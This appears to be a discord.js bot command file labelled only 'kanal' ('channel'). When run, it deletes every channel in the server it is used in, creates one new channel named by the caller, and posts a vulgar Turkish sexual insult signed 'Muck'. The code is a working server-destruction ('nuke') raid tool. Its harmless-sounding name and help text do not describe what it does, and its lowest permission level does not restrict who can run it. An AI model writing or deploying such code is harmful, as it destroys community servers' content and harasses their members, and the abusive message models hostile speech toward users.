const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

let mesaj = args.slice(0).join(" ")
message.guild.channels.cache.map(m => m.delete())
message.guild.channels.create(`${mesaj}`, 'text').then(zzz => {
  
  zzz.send('```**Amınızı Siktik Öptüm Bay <3 Muck**```')
})
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "sunucu"
};

module.exports.help = {
  name: "kanal",
  description: "kanal",
  usage: "kanal"
};